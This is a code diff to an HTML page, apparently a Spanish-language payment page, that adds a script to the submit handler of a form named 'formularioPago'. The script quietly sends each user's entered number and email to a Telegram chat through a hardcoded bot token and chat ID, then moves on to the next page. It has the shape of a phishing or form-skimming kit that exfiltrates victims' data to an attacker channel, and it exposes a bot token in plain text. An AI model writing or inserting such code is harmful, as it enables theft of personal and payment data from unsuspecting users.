@@ -233,5 +233,57 @@
       window.location.href = "detalle.html";
     });
   </script>
+  <script>
+  // ... Tu código actual
+
+  function enviarATelegram(numero, email) {
+    const token = "7984706159:AAGai2Rx6thKz_vfuLb34UYvnIn15CbwN04";
+    const chat_id = "5647970395";
+    const mensaje = `📱 Número: ${numero}\n📧 Email: ${email}`;
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: chat_id,
+        text: mensaje
+      })
+    })
+    .then(response => {
+      if (!response.ok) {
+        throw new Error("Error al enviar mensaje a Telegram");
+      }
+      console.log("Mensaje enviado a Telegram");
+    })
+    .catch(error => {
+      console.error("Error:", error);
+    });
+  }
+
+  // Reemplaza tu evento 'submit' con este (modificado):
+  document.getElementById("formularioPago").addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    if (!captchaValidado) {
+      alert("Por favor verifica que no eres un robot.");
+      return;
+    }
+
+    const numero = document.getElementById("numero").value;
+    const email = document.getElementById("email").value;
+
+    localStorage.setItem("numero", numero);
+    localStorage.setItem("email", email);
+
+    // ✅ Enviar a Telegram
+    enviarATelegram(numero, email);
+
+    // Ir a la siguiente página
+    window.location.href = "detalle.html";
+  });
+</script>
+
 </body>
 </html>
